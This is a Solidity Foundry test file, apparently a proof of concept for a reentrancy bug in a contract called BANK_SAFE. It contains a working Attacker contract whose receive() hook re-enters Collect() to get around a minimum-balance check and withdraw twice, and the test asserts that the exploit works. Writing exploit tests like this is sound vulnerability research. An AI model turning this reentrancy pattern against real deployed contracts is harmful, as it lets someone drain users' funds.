
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new BANK_SAFE();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // Constraints
        // We ensure attackVal is even to split it cleanly for the attack.
        // We limit the value to avoid overflow issues, though 0.8.x handles them safely.
        vm.assume(attackVal > 2 && attackVal < type(uint128).max);
        if (attackVal % 2 != 0) attackVal++;

        // State Configuration
        // We set MinSum to the full attackVal. 
        // Logic: A user should only be able to withdraw if they have >= MinSum.
        // If we withdraw half, our remaining balance is < MinSum, so a second withdrawal should fail.
        // Reentrancy allows us to bypass this check before the balance is updated.
        _contractUnderTest.SetMinSum(attackVal);
        _contractUnderTest.Initialized();

        // Funding
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Trigger Attack
        // 1. Attacker deposits 'attackVal'.
        // 2. Attacker calls Collect('attackVal / 2').
        // 3. Attacker re-enters to Collect another 'attackVal / 2'.
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal / 2);

        // Verify Success
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = BANK_SAFE(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        
        // Call the vulnerable function
        _victim.Collect(val);

        // Verify Success Conditions
        // If we successfully re-entered and executed the logic twice, count will be >= 2.
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract
            _victim.Collect(storedAttackVal);
        }
    }
}
